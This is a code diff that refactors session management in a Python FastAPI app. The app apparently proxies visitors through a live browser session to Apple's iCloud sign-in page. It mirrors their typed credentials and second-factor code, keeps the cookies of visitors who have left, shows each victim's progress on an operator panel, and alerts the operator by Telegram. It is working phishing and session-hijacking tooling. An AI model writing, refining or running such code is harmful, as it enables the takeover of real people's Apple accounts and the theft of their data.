@@ -24,12 +24,10 @@ living only in one browser tab.
 import asyncio
 import html as html_module
 import json
-import urllib.parse
 import logging
 import mimetypes
 import os
 import re
-import secrets
 import sys
 import time
 from contextlib import asynccontextmanager
@@ -42,6 +40,7 @@ from fastapi.responses import (FileResponse, HTMLResponse, JSONResponse,
 
 import admin
 import live
+import sessions
 import telegram as telegram_module
 
 HERE = Path(__file__).parent
@@ -64,19 +63,14 @@ ICLOUD = "https://www.icloud.com/"
 # is captured from it any more.
 SIGNIN_BUTTON = "ui-button.sign-in-button"
 
-# Where each visitor's browser keeps its profile. A profile is a browser's
-# memory: the cookies, the "trust this device" answer, the half-typed
-# address. Giving every visitor their own directory is what lets two people
-# use the app at the same time without signing in as each other.
-PROFILES = Path(os.environ.get("ICLOUD_PROFILES") or (HERE / "visitors")).resolve()
-
-# The cookie that says which visitor this is. It is a name, not a secret:
-# it says whose browser this is, and nothing else.
-SESSION_COOKIE = "icloud_session"
-
-# What a visitor's name may look like. It is a name the server made, so it
-# is checked before it is used as a folder name.
-SESSION_ID = re.compile(r"^[A-Za-z0-9_-]{8,64}$")
+# Who a client is belongs to the session manager: the folder their browser
+# keeps its profile in, the cookie that says whose browser it is, and what
+# a name is allowed to look like. They are read here because everything
+# that serves a capture is named by them, and the manager is the one place
+# a client comes through.
+PROFILES = sessions.PROFILES
+SESSION_COOKIE = sessions.SESSION_COOKIE
+SESSION_ID = sessions.SESSION_ID
 
 
 def session_cookie(session_id: str) -> str:
@@ -338,6 +332,9 @@ async def start_browser(session: "Session"):
             session.ctx, session.page = await launch(session)
 
         session.state["browser_open"] = True
+        # The browser is up: the manager says so, so the panel stops saying
+        # the client is only arriving.
+        SESSIONS.changed(session, why="browser-open")
 
         # The browser is the session. The capture is a copy of a moment of
         # it, and this is what connects the two: what is typed into the
@@ -362,7 +359,7 @@ async def start_browser(session: "Session"):
         session.state["status"] = "error"
         session.state["error"] = str(exc).splitlines()[0]
         log(f"FAILED: {session.state['error']}")
-        admin.note("error", session=session.id)
+        SESSIONS.failed(session, session.state["error"])
 
     return session.state
 
@@ -948,14 +945,18 @@ class Hub:
         # Where the browser is, so a viewer that joins late is looking at the
         # same session the others are.
         viewer.send({"t": "browser", **self.browser})
-        # Somebody is here now, and the panel wants to know.
-        admin.push()
+        # Somebody is here now, and the manager says so. The panel is a
+        # subscriber, so it hears it from the manager rather than being
+        # poked from inside the hub.
+        if self.session is not None:
+            SESSIONS.changed(self.session, why="presence")
 
     def leave(self, viewer: Viewer) -> None:
         self.viewers.discard(viewer)
         viewer.close()
-        # They are not here any more, and the panel wants to know.
-        admin.push()
+        # They are not here any more, and the manager says so.
+        if self.session is not None:
+            SESSIONS.changed(self.session, why="presence")
 
     def broadcast(self, message: dict, sender: Viewer | None = None) -> None:
         for viewer in list(self.viewers):
@@ -982,8 +983,9 @@ class Hub:
         # Form values belong to the page they were typed on.
         self.values = {}
         log(f"page: {page}")
-        # The step the client is on has changed: the panel wants to know.
-        admin.push()
+        # The step the client is on has changed: the manager says so.
+        if self.session is not None:
+            SESSIONS.changed(self.session, why="page")
         self.broadcast({"t": "nav", "page": page},
                        sender=None if everyone else sender)
         return True
@@ -994,11 +996,14 @@ class Hub:
         The code was good and the browser is in. Every viewer is sent there,
         and the captures are closed to them from then on.
         """
-        if not self.finished:
-            admin.note("finished")
+        was_finished = self.finished
         self.finished = True
         self.page = ICLOUD
-        admin.push()
+        # The manager says the client is through, in the same breath as the
+        # hub recording it - the panel hears it from there. A client who
+        # reloads after getting in is not through a second time.
+        if not was_finished and self.session is not None:
+            SESSIONS.finished(self.session)
         # Form values belong to the page they were typed on.
         self.values = {}
         log("going to icloud.com")
@@ -1317,16 +1322,22 @@ class Session:
         self.state["status"] = "idle"
 
 
-SESSIONS: dict[str, Session] = {}
+# Every client, in one place. The manager is the door a visitor comes
+# through - ``arrive`` makes their session, ``lookup`` finds it, ``retire``
+# puts it away - and it tells whoever subscribed when any of that happens.
+# The control room is a subscriber, so the panel is told what changed
+# rather than asking for the list again.
+SESSIONS = sessions.MANAGER
 
 # The sessions that have gone away. A visitor whose browser has been shut
 # down is still a visitor: the panel says what they got to and when they
-# were last here, and the profile they left behind is still on disk.
-GONE: dict[str, dict] = {}
+# were last here, and the profile they left behind is still on disk. It is
+# the manager's own record, not a second one kept here.
+GONE = SESSIONS.gone
 
 
 def new_session_id() -> str:
-    return secrets.token_urlsafe(12)
+    return sessions.new_session_id()
 
 
 async def notify_new_client(sid: str) -> None:
@@ -1349,21 +1360,9 @@ async def notify_new_client(sid: str) -> None:
         log(f"telegram: not told about {sid} - {said}")
 
 
-def visitor_of(request) -> str:
-    """The name this request says the visitor is.
-
-    The page keeps the name in its own storage and sends it with the
-    request; the cookie says the same thing afterwards, so the name can be
-    read either way. The cookie wins when both are there, because it is what
-    the server said last.
-    """
-    kept = request.cookies.get(SESSION_COOKIE, "")
-    if kept and SESSION_ID.match(kept):
-        return kept
-    query = request.scope.get("query_string", b"") or b""
-    named = urllib.parse.parse_qs(query.decode("utf-8", "replace")).get(
-        "visitor", [""])[0]
-    return named if SESSION_ID.match(named) else ""
+# Whose request this is, said by the cookie or by the page. The manager
+# reads it, because the manager is what a name belongs to.
+visitor_of = sessions.visitor_of
 
 
 def session_for_named(request) -> Session | None:
@@ -1382,35 +1381,26 @@ def session_lookup(sid: str | None) -> Session | None:
     """The session this name belongs to, if there is one.
 
     Looking up is not the same as making: a route that only reads what is
-    going on must not give a visitor a session of their own.
+    going on must not give a visitor a session of their own. The manager is
+    asked, and it is asked without being written to.
     """
-    if not sid or not SESSION_ID.match(sid):
-        return None
-    session = SESSIONS.get(sid)
-    if session is not None:
-        session.touch()
-    return session
+    return SESSIONS.lookup(sid)
 
 
 def session_for(sid: str | None) -> Session:
-    """The session this name belongs to, made new if there is none."""
-    if not sid or not SESSION_ID.match(sid):
-        sid = new_session_id()
+    """The session this name belongs to, made new if there is none.
 
-    session = SESSIONS.get(sid)
-    if session is None:
-        session = Session(sid)
-        SESSIONS[sid] = session
-        # A client who comes back is here, not gone: the record of their
-        # last visit is dropped, so the panel does not say they have left
-        # while they are sitting right there.
-        back = GONE.pop(sid, None) is not None
-        if back:
-            log(f"session {sid} is back")
-            admin.note("back", session=sid)
-        else:
-            log(f"new session {sid}")
-            admin.note("connected", session=sid)
+    The manager makes it, and it is the manager that says a client has
+    connected - the panel hears it from there, not from here. What is left
+    to do here is the app's own business: a line in the console, and a note
+    to the operator about a client who has not been here before.
+    """
+    session, how = SESSIONS.arrive(sid, Session)
+
+    if how == "back":
+        log(f"session {session.id} is back")
+    elif how == "new":
+        log(f"new session {session.id}")
         # A note to Telegram, in the background: the person connecting must
         # not wait for Telegram, and Telegram being down must not break the
         # app. Nothing is sent - and nothing is started - when there is
@@ -1419,11 +1409,10 @@ def session_for(sid: str | None) -> Session:
         # A client who is coming back is not a new client, and the operator
         # has already been told about them.
         settings = admin.STORE.telegram()
-        if (not back and settings["enabled"]
+        if (settings["enabled"]
                 and settings["token"] and settings["chat_id"]):
-            spawn(notify_new_client(sid))
+            spawn(notify_new_client(session.id))
 
-    session.touch()
     return session
 
 
@@ -1445,7 +1434,7 @@ async def close_idle_sessions() -> None:
         log(f"session {sid} has gone away - closing its browser")
         # What they got to is remembered, so that the panel can say it:
         # a visitor who has gone is still a visitor.
-        GONE[sid] = {
+        record = {
             "page": session.hub.page,
             "stage": admin.stage_of(session),
             "url": (session.hub.browser or {}).get("url", ""),
@@ -1459,11 +1448,13 @@ async def close_idle_sessions() -> None:
         # can still show them.
         try:
             if session.ctx is not None:
-                GONE[sid]["cookies"] = await session.ctx.cookies()
+                record["cookies"] = await session.ctx.cookies()
         except Exception:
             pass
         await session.close()
-        SESSIONS.pop(sid, None)
+        # The manager puts the session away and says so: the panel is told
+        # that this client has gone, and it remembers what they got to.
+        SESSIONS.retire(sid, record)
 
 
 # --------------------------------------------------------------------------
@@ -1610,6 +1601,13 @@ async def poll_browser(session: "Session") -> None:
     session that is never idle, and a browser that is never closed.
     """
 
+    # There is no browser to look at. Its visitor has not opened the app
+    # yet, or they have gone and it has been shut. Asking a browser that is
+    # not there is answered with nothing, and that nothing would replace
+    # what the panel last knew with an empty answer.
+    if not session.bridge.is_open():
+        return
+
     # The values and presses that had nowhere to go yet are tried again
     # first: the sign-in widget is a frame Apple loads a second or two
     # after Sign In is clicked, and a value typed before it is there
@@ -1665,8 +1663,8 @@ async def poll_browser(session: "Session") -> None:
     session.hub.browser = state
     session.hub.broadcast({"t": "browser", **state})
     # The browser is showing something new. The panel shows where it is
-    # and what it is doing, so the panel is told.
-    admin.push()
+    # and what it is doing, and the manager is what tells it.
+    SESSIONS.changed(session, why="browser")
 
 
 def browser_is_signed_in(state: dict, saw_the_form: bool = False) -> bool:
@@ -1849,6 +1847,13 @@ async def watch_sessions() -> None:
                 pass
         try:
             await close_idle_sessions()
+        except Exception:
+            pass
+        # Anything that changed without saying so - a page moved, a browser
+        # opened, a viewer arrived - is said here. The panel is never left
+        # showing a list the manager no longer holds.
+        try:
+            SESSIONS.sync()
         except Exception:
             pass
         # A panel whose secret is no longer the secret is told so, and the
